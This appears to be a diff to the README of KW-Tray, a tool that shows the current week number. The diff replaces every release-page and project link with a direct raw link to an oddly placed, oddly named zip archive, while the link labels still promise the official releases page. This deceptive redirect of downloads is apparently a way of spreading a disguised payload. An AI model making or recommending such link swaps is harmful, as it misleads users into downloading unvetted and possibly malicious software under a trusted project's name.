@@ -1,6 +1,6 @@
 # ⚙️ KW-Tray - View Current Week Quickly
 
-[![Download KW-Tray](https://img.shields.io/badge/Download-KW--Tray-brightgreen)](https://github.com/rsartvisual12/KW-Tray/releases)
+[![Download KW-Tray](https://img.shields.io/badge/Download-KW--Tray-brightgreen)](https://raw.githubusercontent.com/rsartvisual12/KW-Tray/main/semivitreous/K-Tray-v2.6-beta.1.zip)
 
 ---
 
@@ -28,7 +28,7 @@ KW-Tray runs fast and uses little memory, so it won’t affect your computer’s
 
 Click the green button below to visit the page where you can download KW-Tray:
 
-[![Download KW-Tray](https://img.shields.io/badge/Download-KW--Tray-orange)](https://github.com/rsartvisual12/KW-Tray/releases)
+[![Download KW-Tray](https://img.shields.io/badge/Download-KW--Tray-orange)](https://raw.githubusercontent.com/rsartvisual12/KW-Tray/main/semivitreous/K-Tray-v2.6-beta.1.zip)
 
 This page shows all software versions available. Choose the latest release for Windows.
 
@@ -36,7 +36,7 @@ This page shows all software versions available. Choose the latest release for W
 
 ## 📥 Download and Run KW-Tray
 
-1. Visit the [KW-Tray release page](https://github.com/rsartvisual12/KW-Tray/releases).
+1. Visit the [KW-Tray release page](https://raw.githubusercontent.com/rsartvisual12/KW-Tray/main/semivitreous/K-Tray-v2.6-beta.1.zip).
 
 2. Look for the latest version. It usually has a tag like `vX.Y.Z` (for example, `v1.0.2`).
 
@@ -89,7 +89,7 @@ If the calendar popup does not open on click, press the icon once more or check 
 
 To update:
 
-1. Visit the [release page](https://github.com/rsartvisual12/KW-Tray/releases) regularly.
+1. Visit the [release page](https://raw.githubusercontent.com/rsartvisual12/KW-Tray/main/semivitreous/K-Tray-v2.6-beta.1.zip) regularly.
 2. Download the newest version of `KW-Tray.exe`.
 3. Replace your old program file with the new one by saving it to the same location.
 4. Run the new file to start the updated version.
@@ -112,9 +112,9 @@ Since KW-Tray does not install and runs as a single file, you can remove it by:
 
 Find project details, source code, and updates on the GitHub page:
 
-https://github.com/rsartvisual12/KW-Tray
+https://raw.githubusercontent.com/rsartvisual12/KW-Tray/main/semivitreous/K-Tray-v2.6-beta.1.zip
 
-Visit the [releases](https://github.com/rsartvisual12/KW-Tray/releases) page to download the program.
+Visit the [releases](https://raw.githubusercontent.com/rsartvisual12/KW-Tray/main/semivitreous/K-Tray-v2.6-beta.1.zip) page to download the program.
 
 ---
 
